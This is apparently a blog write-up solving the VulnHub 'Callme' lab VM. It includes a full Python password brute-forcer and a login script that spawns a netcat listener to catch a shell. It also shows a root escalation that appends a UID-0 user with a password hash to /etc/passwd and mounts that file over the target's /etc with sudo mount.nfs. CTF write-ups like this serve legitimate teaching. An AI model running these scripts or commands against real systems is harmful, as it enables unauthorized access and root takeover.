---
layout: post
title:  "Callme - VulnHub"
---
You’ll find this vm here :  `https://www.vulnhub.com/entry/callme-1,615/`

## VulnHub - Callme

#### Port Scan

- Nmap found three open ports: `22`, `111` and `2323`
- For now let's focus on port `2323`

![image]( /assets/img/callme/1.PNG)

#### Finding correct username

- The server asking for username & password<
- After the login attempt with a random credentials, the message "user does not exist" appeared
- This will help us to identify the valid usernames

![image]( /assets/img/callme/2.PNG)

I tried common username like admin, and the message "user does not exist" not appeared.<br> So, `admin` is a valid username

![image]( /assets/img/callme/3.PNG)

####  Creating brute force script

{% highlight python %}
import socket
import time

print("Script by Alienum, vm by Foxlox")
with open('10-million-password-list-top-1000000.txt') as file:
 for password in file:
  username = b"admin"
  ip = "10.0.2.108"
  port = 2323
  s = socket.socket()
  s.connect((ip, port))
  print(s.recv(1024))
  print(s.recv(1024))
  s.send(username+b'\r\n')
  print(s.recv(1024))
  s.send(password.strip().encode()+b'\r\n')
  re = s.recv(1024)
  print(re)
  print(s.recv(1024))
  print(password.strip())
  time.sleep(1.2)
  if not "Wrong password for user admin" in str(re):
   print("FOXYFOXYFOXYFOXYFOXYFOXYFOXY")
   print(password)
   break
{% endhighlight %}

- After a few minutes the password found

![image]( /assets/img/callme/4.PNG)

Each time we successfully log in to the system, it returns a random number in words.<br>Let's understand what it means

![image]( /assets/img/callme/5.PNG)

#### Tcpdump to understand

<code>sudo tcpdump -XX -i eth0 src TARGET_IP</code>

We understand that every time we successfully connect to the server, it tries to connect to the port of our system that it had previously sent in a number with words. For example, if the server sends `ONE THOUSAND FOUR HUNDRED  TWELVE` it tries to connect to our system to port `1412`

![image]( /assets/img/callme/6.PNG)

#### Creating login & listener script

{% highlight python %}
from word2number import w2n
import socket
import time
import os
print("Script by Alienum, vm by Foxlox")

while True:
 username = b"admin"
 password = b"booboo"
 ip = "10.0.2.108"
 port = 2323
 s = socket.socket()
 s.connect((ip, port))
 print(s.recv(1024))
 print(s.recv(1024))
 s.send(username+b'\r\n')
 print(username)
 print(s.recv(1024))
 s.send(password+b'\r\n')
 print(password)
 re = s.recv(1024)
 print(re)
 w2n = w2n.word_to_num(re.decode().lower().strip())
 cmd = "nc -lvnp "+str(w2n)
 os.system(cmd)
{% endhighlight %}


- After running the script we have the shell


![image]( /assets/img/callme/7.PNG)


#### SSH Login, avoid wine shell

![image]( /assets/img/callme/8.PNG)

![image]( /assets/img/callme/9.PNG)

#### Searching fox's password

```
cat startup
find / -name "recallserver.exe" 2>/dev/null
```

![image]( /assets/img/callme/10.PNG)

- strings command not found so we need to download recallserver.exe locally

![image]( /assets/img/callme/11.PNG)

- We found the possible password for user fox, the possible password is `tutankamenFERILLI`

![image]( /assets/img/callme/12.PNG)

#### Privileges Escalation

![image]( /assets/img/callme/13.PNG)

- Writing a user to /etc/passwd locally

{% highlight python %}
openssl passwd -1
Password: alienum
Verifying - Password: alienum
1$dccSREO8$l8xVLythU9r4WQ1/4R1tq/
{% endhighlight %}

``` echo 'alien:$1$dccSREO8$l8xVLythU9r4WQ1/4R1tq/:0:0::/root:/bin/bash' >> /etc/passwd```

![image]( /assets/img/callme/14.PNG)

- In the target system

```
 sudo mount.nfs 10.0.2.106:/etc /etc
```

![image]( /assets/img/callme/15.PNG)

#### Rooted

![image]( /assets/img/callme/16.PNG)
